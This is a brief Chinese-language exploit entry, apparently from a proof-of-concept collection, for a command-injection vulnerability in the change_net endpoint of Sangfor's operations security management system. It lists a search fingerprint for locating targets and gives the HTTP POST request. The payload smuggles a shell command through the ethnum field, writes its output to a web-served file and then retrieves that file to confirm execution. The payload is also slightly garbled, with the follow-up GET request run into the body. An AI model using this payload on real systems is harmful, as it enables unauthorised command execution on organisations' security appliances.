# 深信服change_net存在命令执行漏洞

- **系统**：深信服　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`product="SANGFOR-运维安全管理系统"`
- **请求**：`POST /fort/system;help/netConfig/change_net HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`Sec-Fetch-User: ?1`

**请求体 / payload**
```
sta=static&ipv=4&ethnum=;id  tee /usr/local/tomcat/webapps/fort/trust/version/hello1.txt;&address=1.1.1.1&netmask=2.2.2.2&gateWay=3.3.3.3GET /fort/trust/version/hello1.txt HTTP/1.1
Host:
```
- **预期**：200　|　—